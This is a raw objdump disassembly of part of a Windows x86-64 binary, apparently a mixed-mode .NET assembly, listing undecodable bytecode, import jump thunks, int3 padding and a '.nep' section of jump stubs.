   140008894:	7e 00                	jle    0x140008896
   140008896:	00 11                	add    %dl,(%rcx)
   140008898:	16                   	(bad)
   140008899:	0a 28                	or     (%rax),%ch
   14000889b:	41 00 00             	add    %al,(%r8)
   14000889e:	0a 02                	or     (%rdx),%al
   1400088a0:	72 9d                	jb     0x14000883f
   1400088a2:	05 00 70 28 bf       	add    $0xbf287000,%eax
   1400088a7:	00 00                	add    %al,(%rax)
   1400088a9:	06                   	(bad)
   1400088aa:	26 28 41 00          	es sub %al,0x0(%rcx)
   1400088ae:	00 0a                	add    %cl,(%rdx)
   1400088b0:	de 0e                	fimuls (%rsi)
   1400088b2:	7f 77                	jg     0x14000892b
   1400088b4:	00 00                	add    %al,(%rax)
   1400088b6:	04 28                	add    $0x28,%al
   1400088b8:	34 00                	xor    $0x0,%al
   1400088ba:	00 0a                	add    %cl,(%rdx)
   1400088bc:	26 17                	es (bad)
   1400088be:	0a dc                	or     %ah,%bl
   1400088c0:	02 28                	add    (%rax),%ch
   1400088c2:	b4 00                	mov    $0x0,%ah
   1400088c4:	00 06                	add    %al,(%rsi)
   1400088c6:	de 32                	fidivs (%rdx)
   1400088c8:	0b 06                	or     (%rsi),%eax
   1400088ca:	2c 07                	sub    $0x7,%al
   1400088cc:	02 07                	add    (%rdi),%al
   1400088ce:	28 b9 00 00 06 02    	sub    %bh,0x2060000(%rcx)
   1400088d4:	28 be 00 00 06 07    	sub    %bh,0x7060000(%rsi)
   1400088da:	28 99 00 00 06 de    	sub    %bl,-0x21fa0000(%rcx)
   1400088e0:	19 0c 06             	sbb    %ecx,(%rsi,%rax,1)
   1400088e3:	2c 07                	sub    $0x7,%al
   1400088e5:	02 14 28             	add    (%rax,%rbp,1),%dl
   1400088e8:	b9 00 00 06 02       	mov    $0x2060000,%ecx
   1400088ed:	28 be 00 00 06 14    	sub    %bh,0x14060000(%rsi)
   1400088f3:	28 99 00 00 06 de    	sub    %bl,-0x21fa0000(%rcx)
   1400088f9:	00 2a                	add    %ch,(%rdx)
   1400088fb:	00 41 4c             	add    %al,0x4c(%rcx)
   1400088fe:	00 00                	add    %al,(%rax)
   140008900:	02 00                	add    (%rax),%al
   140008902:	00 00                	add    %al,(%rax)
   140008904:	18 00                	sbb    %al,(%rax)
   140008906:	00 00                	add    %al,(%rax)
   140008908:	02 00                	add    (%rax),%al
   14000890a:	00 00                	add    %al,(%rax)
   14000890c:	1a 00                	sbb    (%rax),%al
   14000890e:	00 00                	add    %al,(%rax)
   140008910:	0e                   	(bad)
   140008911:	00 00                	add    %al,(%rax)
   140008913:	00 46 00             	add    %al,0x0(%rsi)
   140008916:	00 01                	add    %al,(%rcx)
   140008918:	00 00                	add    %al,(%rax)
   14000891a:	00 00                	add    %al,(%rax)
   14000891c:	07                   	(bad)
   14000891d:	00 00                	add    %al,(%rax)
   14000891f:	00 29                	add    %ch,(%rcx)
   140008921:	00 00                	add    %al,(%rax)
   140008923:	00 30                	add    %dh,(%rax)
   140008925:	00 00                	add    %al,(%rax)
   140008927:	00 19                	add    %bl,(%rcx)
   140008929:	00 00                	add    %al,(%rax)
   14000892b:	00 30                	add    %dh,(%rax)
   14000892d:	00 00                	add    %al,(%rax)
   14000892f:	01 00                	add    %eax,(%rax)
   140008931:	00 00                	add    %al,(%rax)
   140008933:	00 07                	add    %al,(%rdi)
   140008935:	00 00                	add    %al,(%rax)
   140008937:	00 29                	add    %ch,(%rcx)
   140008939:	00 00                	add    %al,(%rax)
   14000893b:	00 49 00             	add    %cl,0x0(%rcx)
   14000893e:	00 00                	add    %al,(%rax)
   140008940:	19 00                	sbb    %eax,(%rax)
   140008942:	00 00                	add    %al,(%rax)
   140008944:	03 00                	add    (%rax),%eax
   140008946:	00 01                	add    %al,(%rcx)
   140008948:	0b 30                	or     (%rax),%esi
   14000894a:	02 00                	add    (%rax),%al
   14000894c:	27                   	(bad)
   14000894d:	00 00                	add    %al,(%rax)
   14000894f:	00 80 00 00 11 12    	add    %al,0x12110000(%rax)
   140008955:	00 28                	add    %ch,(%rax)
   140008957:	ba 00 00 06 26       	mov    $0x26060000,%edx
   14000895c:	12 00                	adc    (%rax),%al
   14000895e:	28 bc 00 00 06 de 0e 	sub    %bh,0xede0600(%rax,%rax,1)
   140008965:	fe 06                	incb   (%rsi)
   140008967:	bb 00 00 06 12       	mov    $0x12060000,%ebx
   14000896c:	00 28                	add    %ch,(%rax)
   14000896e:	7d 00                	jge    0x140008970
   140008970:	00 06                	add    %al,(%rsi)
   140008972:	dc 12                	fcoml  (%rdx)
   140008974:	00 28                	add    %ch,(%rax)
   140008976:	bb 00 00 06 2a       	mov    $0x2a060000,%ebx
   14000897b:	00 41 1c             	add    %al,0x1c(%rcx)
   14000897e:	00 00                	add    %al,(%rax)
   140008980:	04 00                	add    $0x0,%al
   140008982:	00 00                	add    %al,(%rax)
   140008984:	08 00                	or     %al,(%rax)
   140008986:	00 00                	add    %al,(%rax)
   140008988:	09 00                	or     %eax,(%rax)
   14000898a:	00 00                	add    %al,(%rax)
   14000898c:	11 00                	adc    %eax,(%rax)
   14000898e:	00 00                	add    %al,(%rax)
   140008990:	0e                   	(bad)
   140008991:	00 00                	add    %al,(%rax)
   140008993:	00 46 00             	add    %al,0x0(%rsi)
   140008996:	00 01                	add    %al,(%rcx)
   140008998:	03 30                	add    (%rax),%esi
   14000899a:	01 00                	add    %eax,(%rax)
   14000899c:	15 00 00 00 00       	adc    $0x0,%eax
   1400089a1:	00 00                	add    %al,(%rax)
   1400089a3:	00 73 05             	add    %dh,0x5(%rbx)
   1400089a6:	00 00                	add    %al,(%rax)
   1400089a8:	0a 80 d7 00 00 04    	or     0x40000d7(%rax),%al
   1400089ae:	73 0a                	jae    0x1400089ba
   1400089b0:	01 00                	add    %eax,(%rax)
   1400089b2:	06                   	(bad)
   1400089b3:	80 d8 00             	sbb    $0x0,%al
   1400089b6:	00 04 2a             	add    %al,(%rdx,%rbp,1)
   1400089b9:	cc                   	int3
   1400089ba:	cc                   	int3
   1400089bb:	cc                   	int3
   1400089bc:	03 30                	add    (%rax),%esi
   1400089be:	02 00                	add    (%rax),%al
   1400089c0:	22 00                	and    (%rax),%al
   1400089c2:	00 00                	add    %al,(%rax)
   1400089c4:	85 00                	test   %eax,(%rax)
   1400089c6:	00 11                	add    %dl,(%rcx)
   1400089c8:	16                   	(bad)
   1400089c9:	0a 02                	or     (%rdx),%al
   1400089cb:	03 34 1a             	add    (%rdx,%rbx,1),%esi
   1400089ce:	06                   	(bad)
   1400089cf:	2d 17 02 4c 0b       	sub    $0xb4c0217,%eax
   1400089d4:	07                   	(bad)
   1400089d5:	2c 07                	sub    $0x7,%al
   1400089d7:	07                   	(bad)
   1400089d8:	29 83 00 00 11 0a    	sub    %eax,0xa110000(%rbx)
   1400089de:	02 1e                	add    (%rsi),%bl
   1400089e0:	6a 58                	push   $0x58
   1400089e2:	10 00                	adc    %al,(%rax)
   1400089e4:	02 03                	add    (%rbx),%al
   1400089e6:	37                   	(bad)
   1400089e7:	e6 06                	out    %al,$0x6
   1400089e9:	2a cc                	sub    %ah,%cl
   1400089eb:	cc                   	int3
   1400089ec:	03 30                	add    (%rax),%esi
   1400089ee:	02 00                	add    (%rax),%al
   1400089f0:	1b 00                	sbb    (%rax),%eax
   1400089f2:	00 00                	add    %al,(%rax)
   1400089f4:	18 00                	sbb    %al,(%rax)
   1400089f6:	00 11                	add    %dl,(%rcx)
   1400089f8:	02 03                	add    (%rbx),%al
   1400089fa:	34 16                	xor    $0x16,%al
   1400089fc:	02 4c 0a 06          	add    0x6(%rdx,%rcx,1),%cl
   140008a00:	2c 06                	sub    $0x6,%al
   140008a02:	06                   	(bad)
   140008a03:	29 81 00 00 11 02    	sub    %eax,0x2110000(%rcx)
   140008a09:	1e                   	(bad)
   140008a0a:	6a 58                	push   $0x58
   140008a0c:	10 00                	adc    %al,(%rax)
   140008a0e:	02 03                	add    (%rbx),%al
   140008a10:	37                   	(bad)
   140008a11:	ea                   	(bad)
   140008a12:	2a cc                	sub    %ah,%cl
   140008a14:	03 30                	add    (%rax),%esi
   140008a16:	01 00                	add    %eax,(%rax)
   140008a18:	15 00 00 00 00       	adc    $0x0,%eax
   140008a1d:	00 00                	add    %al,(%rax)
   140008a1f:	00 d0                	add    %dl,%al
   140008a21:	73 00                	jae    0x140008a23
   140008a23:	00 02                	add    %al,(%rdx)
   140008a25:	28 07                	sub    %al,(%rdi)
   140008a27:	00 00                	add    %al,(%rax)
   140008a29:	0a 6f 08             	or     0x8(%rdi),%ch
   140008a2c:	00 00                	add    %al,(%rax)
   140008a2e:	0a 28                	or     (%rax),%ch
   140008a30:	60                   	(bad)
   140008a31:	00 00                	add    %al,(%rax)
   140008a33:	0a 2a                	or     (%rdx),%ch
   140008a35:	cc                   	int3
   140008a36:	cc                   	int3
   140008a37:	cc                   	int3
   140008a38:	03 30                	add    (%rax),%esi
   140008a3a:	02 00                	add    (%rax),%al
   140008a3c:	20 00                	and    %al,(%rax)
   140008a3e:	00 00                	add    %al,(%rax)
   140008a40:	88 00                	mov    %al,(%rax)
   140008a42:	00 11                	add    %dl,(%rcx)
   140008a44:	28 c4                	sub    %al,%ah
   140008a46:	00 00                	add    %al,(%rax)
   140008a48:	06                   	(bad)
   140008a49:	0c 12                	or     $0x12,%al
   140008a4b:	02 02                	add    (%rdx),%al
   140008a4d:	69 28 5e 00 00 0a    	imul   $0xa00005e,(%rax),%ebp
   140008a53:	0b 12                	or     (%rdx),%edx
   140008a55:	01 28                	add    %ebp,(%rax)
   140008a57:	5f                   	pop    %rdi
   140008a58:	00 00                	add    %al,(%rax)
   140008a5a:	0a 0a                	or     (%rdx),%cl
   140008a5c:	12 00                	adc    (%rax),%al
   140008a5e:	28 31                	sub    %dh,(%rcx)
   140008a60:	00 00                	add    %al,(%rax)
   140008a62:	0a 2a                	or     (%rdx),%ch
   140008a64:	03 30                	add    (%rax),%esi
   140008a66:	02 00                	add    (%rax),%al
   140008a68:	21 00                	and    %eax,(%rax)
   140008a6a:	00 00                	add    %al,(%rax)
   140008a6c:	18 00                	sbb    %al,(%rax)
   140008a6e:	00 11                	add    %dl,(%rcx)
   140008a70:	02 03                	add    (%rbx),%al
   140008a72:	34 1c                	xor    $0x1c,%al
   140008a74:	02 4c 0a 06          	add    0x6(%rdx,%rcx,1),%cl
   140008a78:	2c 0c                	sub    $0xc,%al
   140008a7a:	06                   	(bad)
   140008a7b:	28 c6                	sub    %al,%dh
   140008a7d:	00 00                	add    %al,(%rax)
   140008a7f:	06                   	(bad)
   140008a80:	29 82 00 00 11 26    	sub    %eax,0x26110000(%rdx)
   140008a86:	02 1e                	add    (%rsi),%bl
   140008a88:	6a 58                	push   $0x58
   140008a8a:	10 00                	adc    %al,(%rax)
   140008a8c:	02 03                	add    (%rbx),%al
   140008a8e:	37                   	(bad)
   140008a8f:	e4 2a                	in     $0x2a,%al
   140008a91:	ff 25 71 15 00 00    	jmp    *0x1571(%rip)        # 0x14000a008
   140008a97:	ff 25 73 15 00 00    	jmp    *0x1573(%rip)        # 0x14000a010
   140008a9d:	ff 25 75 15 00 00    	jmp    *0x1575(%rip)        # 0x14000a018
   140008aa3:	ff 25 77 15 00 00    	jmp    *0x1577(%rip)        # 0x14000a020
   140008aa9:	ff 25 c9 15 00 00    	jmp    *0x15c9(%rip)        # 0x14000a078
   140008aaf:	ff 25 1b 16 00 00    	jmp    *0x161b(%rip)        # 0x14000a0d0
   140008ab5:	ff 25 45 16 00 00    	jmp    *0x1645(%rip)        # 0x14000a100
   140008abb:	ff 25 07 16 00 00    	jmp    *0x1607(%rip)        # 0x14000a0c8
   140008ac1:	ff 25 31 16 00 00    	jmp    *0x1631(%rip)        # 0x14000a0f8
   140008ac7:	ff 25 1b 16 00 00    	jmp    *0x161b(%rip)        # 0x14000a0e8
   140008acd:	ff 25 ed 15 00 00    	jmp    *0x15ed(%rip)        # 0x14000a0c0
   140008ad3:	ff 25 07 16 00 00    	jmp    *0x1607(%rip)        # 0x14000a0e0
   140008ad9:	ff 25 d1 15 00 00    	jmp    *0x15d1(%rip)        # 0x14000a0b0
   140008adf:	ff 25 d3 15 00 00    	jmp    *0x15d3(%rip)        # 0x14000a0b8
   140008ae5:	ff 25 15 17 00 00    	jmp    *0x1715(%rip)        # 0x14000a200
   140008aeb:	ff 25 ef 16 00 00    	jmp    *0x16ef(%rip)        # 0x14000a1e0
   140008af1:	ff 25 f1 16 00 00    	jmp    *0x16f1(%rip)        # 0x14000a1e8
   140008af7:	ff 25 4b 16 00 00    	jmp    *0x164b(%rip)        # 0x14000a148
   140008afd:	ff 25 c5 16 00 00    	jmp    *0x16c5(%rip)        # 0x14000a1c8
   140008b03:	ff 25 b7 16 00 00    	jmp    *0x16b7(%rip)        # 0x14000a1c0
   140008b09:	ff 25 a9 16 00 00    	jmp    *0x16a9(%rip)        # 0x14000a1b8
   140008b0f:	ff 25 8b 16 00 00    	jmp    *0x168b(%rip)        # 0x14000a1a0
   140008b15:	ff 25 7d 16 00 00    	jmp    *0x167d(%rip)        # 0x14000a198
   140008b1b:	ff 25 6f 16 00 00    	jmp    *0x166f(%rip)        # 0x14000a190
   140008b21:	ff 25 39 16 00 00    	jmp    *0x1639(%rip)        # 0x14000a160
   140008b27:	ff 25 e3 16 00 00    	jmp    *0x16e3(%rip)        # 0x14000a210
   140008b2d:	ff 25 25 16 00 00    	jmp    *0x1625(%rip)        # 0x14000a158
   140008b33:	ff 25 97 16 00 00    	jmp    *0x1697(%rip)        # 0x14000a1d0
   140008b39:	ff 25 71 16 00 00    	jmp    *0x1671(%rip)        # 0x14000a1b0
   140008b3f:	ff 25 33 16 00 00    	jmp    *0x1633(%rip)        # 0x14000a178
   140008b45:	ff 25 5d 16 00 00    	jmp    *0x165d(%rip)        # 0x14000a1a8
   140008b4b:	ff 25 e7 15 00 00    	jmp    *0x15e7(%rip)        # 0x14000a138
   140008b51:	ff 25 d1 15 00 00    	jmp    *0x15d1(%rip)        # 0x14000a128
   140008b57:	ff 25 ab 16 00 00    	jmp    *0x16ab(%rip)        # 0x14000a208
   140008b5d:	ff 25 05 16 00 00    	jmp    *0x1605(%rip)        # 0x14000a168
   140008b63:	ff 25 07 16 00 00    	jmp    *0x1607(%rip)        # 0x14000a170
   140008b69:	ff 25 11 16 00 00    	jmp    *0x1611(%rip)        # 0x14000a180
   140008b6f:	ff 25 13 16 00 00    	jmp    *0x1613(%rip)        # 0x14000a188
   140008b75:	ff 25 95 15 00 00    	jmp    *0x1595(%rip)        # 0x14000a110
   140008b7b:	ff 25 1f 15 00 00    	jmp    *0x151f(%rip)        # 0x14000a0a0
   140008b81:	ff 25 d9 16 00 00    	jmp    *0x16d9(%rip)        # 0x14000a260
   140008b87:	ff 25 cb 16 00 00    	jmp    *0x16cb(%rip)        # 0x14000a258
   140008b8d:	ff 25 bd 16 00 00    	jmp    *0x16bd(%rip)        # 0x14000a250
   140008b93:	ff 25 cf 16 00 00    	jmp    *0x16cf(%rip)        # 0x14000a268
   140008b99:	ff 25 d1 16 00 00    	jmp    *0x16d1(%rip)        # 0x14000a270
   140008b9f:	cc                   	int3
   140008ba0:	40 53                	rex push %rbx
   140008ba2:	48 83 ec 20          	sub    $0x20,%rsp
   140008ba6:	48 8b d9             	mov    %rcx,%rbx
   140008ba9:	eb 0f                	jmp    0x140008bba
   140008bab:	48 8b cb             	mov    %rbx,%rcx
   140008bae:	e8 6c 00 00 00       	call   0x140008c1f
   140008bb3:	85 c0                	test   %eax,%eax
   140008bb5:	74 13                	je     0x140008bca
   140008bb7:	48 8b cb             	mov    %rbx,%rcx
   140008bba:	e8 66 00 00 00       	call   0x140008c25
   140008bbf:	48 85 c0             	test   %rax,%rax
   140008bc2:	74 e7                	je     0x140008bab
   140008bc4:	48 83 c4 20          	add    $0x20,%rsp
   140008bc8:	5b                   	pop    %rbx
   140008bc9:	c3                   	ret
   140008bca:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140008bce:	74 06                	je     0x140008bd6
   140008bd0:	e8 23 df ff ff       	call   0x140006af8
   140008bd5:	cc                   	int3
   140008bd6:	e8 3d df ff ff       	call   0x140006b18
   140008bdb:	cc                   	int3
   140008bdc:	e9 03 00 00 00       	jmp    0x140008be4
   140008be1:	cc                   	int3
   140008be2:	cc                   	int3
   140008be3:	cc                   	int3
   140008be4:	e9 db e7 ff ff       	jmp    0x1400073c4
   140008be9:	ff 25 91 14 00 00    	jmp    *0x1491(%rip)        # 0x14000a080
   140008bef:	ff 25 93 14 00 00    	jmp    *0x1493(%rip)        # 0x14000a088
   140008bf5:	ff 25 05 14 00 00    	jmp    *0x1405(%rip)        # 0x14000a000
   140008bfb:	ff 25 8f 14 00 00    	jmp    *0x148f(%rip)        # 0x14000a090
   140008c01:	ff 25 e9 14 00 00    	jmp    *0x14e9(%rip)        # 0x14000a0f0
   140008c07:	ff 25 cb 14 00 00    	jmp    *0x14cb(%rip)        # 0x14000a0d8
   140008c0d:	ff 25 c5 15 00 00    	jmp    *0x15c5(%rip)        # 0x14000a1d8
   140008c13:	ff 25 07 16 00 00    	jmp    *0x1607(%rip)        # 0x14000a220
   140008c19:	ff 25 d1 15 00 00    	jmp    *0x15d1(%rip)        # 0x14000a1f0
   140008c1f:	ff 25 f3 14 00 00    	jmp    *0x14f3(%rip)        # 0x14000a118
   140008c25:	ff 25 f5 14 00 00    	jmp    *0x14f5(%rip)        # 0x14000a120
   140008c2b:	ff 25 ff 15 00 00    	jmp    *0x15ff(%rip)        # 0x14000a230
   140008c31:	cc                   	int3
   140008c32:	cc                   	int3
   140008c33:	cc                   	int3
   140008c34:	cc                   	int3
   140008c35:	cc                   	int3
   140008c36:	cc                   	int3
   140008c37:	cc                   	int3
   140008c38:	cc                   	int3
   140008c39:	cc                   	int3
   140008c3a:	cc                   	int3
   140008c3b:	cc                   	int3
   140008c3c:	cc                   	int3
   140008c3d:	cc                   	int3
   140008c3e:	cc                   	int3
   140008c3f:	cc                   	int3
   140008c40:	cc                   	int3
   140008c41:	cc                   	int3
   140008c42:	cc                   	int3
   140008c43:	cc                   	int3
   140008c44:	cc                   	int3
   140008c45:	cc                   	int3
   140008c46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008c4d:	00 00 00 
   140008c50:	ff e0                	jmp    *%rax
   140008c52:	cc                   	int3
   140008c53:	cc                   	int3
   140008c54:	cc                   	int3
   140008c55:	cc                   	int3
   140008c56:	cc                   	int3
   140008c57:	cc                   	int3
   140008c58:	cc                   	int3
   140008c59:	cc                   	int3
   140008c5a:	cc                   	int3
   140008c5b:	cc                   	int3
   140008c5c:	cc                   	int3
   140008c5d:	cc                   	int3
   140008c5e:	cc                   	int3
   140008c5f:	cc                   	int3
   140008c60:	cc                   	int3
   140008c61:	cc                   	int3
   140008c62:	cc                   	int3
   140008c63:	cc                   	int3
   140008c64:	cc                   	int3
   140008c65:	cc                   	int3
   140008c66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008c6d:	00 00 00 
   140008c70:	ff 25 1a 16 00 00    	jmp    *0x161a(%rip)        # 0x14000a290
   140008c76:	48 8d 8a 68 00 00 00 	lea    0x68(%rdx),%rcx
   140008c7d:	e9 ce 03 00 00       	jmp    0x140009050
   140008c82:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   140008c89:	e9 c2 03 00 00       	jmp    0x140009050
   140008c8e:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   140008c95:	e9 b6 03 00 00       	jmp    0x140009050
   140008c9a:	48 8d 8a 60 00 00 00 	lea    0x60(%rdx),%rcx
   140008ca1:	e9 aa 03 00 00       	jmp    0x140009050
   140008ca6:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140008cad:	e9 9e 03 00 00       	jmp    0x140009050
   140008cb2:	48 8d 8a 38 00 00 00 	lea    0x38(%rdx),%rcx
   140008cb9:	e9 92 03 00 00       	jmp    0x140009050
   140008cbe:	40 55                	rex push %rbp
   140008cc0:	48 83 ec 20          	sub    $0x20,%rsp
   140008cc4:	48 8b ea             	mov    %rdx,%rbp
   140008cc7:	48 8b d1             	mov    %rcx,%rdx
   140008cca:	48 8b 09             	mov    (%rcx),%rcx
   140008ccd:	8b 09                	mov    (%rcx),%ecx
   140008ccf:	e8 17 fe ff ff       	call   0x140008aeb
   140008cd4:	90                   	nop
   140008cd5:	48 83 c4 20          	add    $0x20,%rsp
   140008cd9:	5d                   	pop    %rbp
   140008cda:	c3                   	ret
   140008cdb:	cc                   	int3
   140008cdc:	40 55                	rex push %rbp
   140008cde:	48 8b ea             	mov    %rdx,%rbp
   140008ce1:	48 8b 01             	mov    (%rcx),%rax
   140008ce4:	33 c9                	xor    %ecx,%ecx
   140008ce6:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140008cec:	0f 94 c1             	sete   %cl
   140008cef:	8b c1                	mov    %ecx,%eax
   140008cf1:	5d                   	pop    %rbp
   140008cf2:	c3                   	ret
   140008cf3:	cc                   	int3
   140008cf4:	03 30                	add    (%rax),%esi
   140008cf6:	01 00                	add    %eax,(%rax)
   140008cf8:	0b 00                	or     (%rax),%eax
   140008cfa:	00 00                	add    %al,(%rax)
   140008cfc:	00 00                	add    %al,(%rax)
   140008cfe:	00 00                	add    %al,(%rax)
   140008d00:	7f 3d                	jg     0x140008d3f
   140008d02:	00 00                	add    %al,(%rax)
   140008d04:	04 28                	add    $0x28,%al
   140008d06:	12 00                	adc    (%rax),%al
   140008d08:	00 06                	add    %al,(%rsi)
   140008d0a:	2a                   	.byte 0x2a

Disassembly of section .nep:

0000000140009000 <.nep>:
   140009000:	eb 08                	jmp    0x14000900a
   140009002:	0f 0b                	ud2
   140009004:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a048
   14000900a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a050
   140009010:	eb 08                	jmp    0x14000901a
   140009012:	0f 0b                	ud2
   140009014:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a058
   14000901a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a060
   140009020:	eb 08                	jmp    0x14000902a
   140009022:	0f 0b                	ud2
   140009024:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a068
   14000902a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a070
   140009030:	eb 08                	jmp    0x14000903a
   140009032:	0f 0b                	ud2
   140009034:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a078
   14000903a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a080
   140009040:	eb 08                	jmp    0x14000904a
   140009042:	0f 0b                	ud2
   140009044:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a088
   14000904a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a090
   140009050:	eb 08                	jmp    0x14000905a
   140009052:	0f 0b                	ud2
   140009054:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a098
   14000905a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0a0
   140009060:	eb 08                	jmp    0x14000906a
   140009062:	0f 0b                	ud2
   140009064:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0a8
   14000906a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0b0
   140009070:	eb 08                	jmp    0x14000907a
   140009072:	0f 0b                	ud2
   140009074:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0b8
   14000907a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0c0
   140009080:	eb 08                	jmp    0x14000908a
   140009082:	0f 0b                	ud2
   140009084:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0c8
   14000908a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0d0
   140009090:	eb 08                	jmp    0x14000909a
   140009092:	0f 0b                	ud2
   140009094:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0d8
   14000909a:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0e0
   1400090a0:	eb 08                	jmp    0x1400090aa
   1400090a2:	0f 0b                	ud2
   1400090a4:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0e8
   1400090aa:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a0f0
   1400090b0:	eb 08                	jmp    0x1400090ba
   1400090b2:	0f 0b                	ud2
   1400090b4:	ff 25 3e 10 01 00    	jmp    *0x1103e(%rip)        # 0x14001a0f8
   1400090ba:	ff 25 40 10 01 00    	jmp    *0x11040(%rip)        # 0x14001a100
   1400090c0:	eb 08                	jmp    0x1400090ca
   1400090c2:	0f 0b                	ud2
   1400090c4:	ff 25 ce 10 01 00    	jmp    *0x110ce(%rip)        # 0x14001a198
   1400090ca:	ff 25 d0 10 01 00    	jmp    *0x110d0(%rip)        # 0x14001a1a0
   1400090d0:	eb 08                	jmp    0x1400090da
   1400090d2:	0f 0b                	ud2
   1400090d4:	ff 25 ce 10 01 00    	jmp    *0x110ce(%rip)        # 0x14001a1a8
   1400090da:	ff 25 d0 10 01 00    	jmp    *0x110d0(%rip)        # 0x14001a1b0
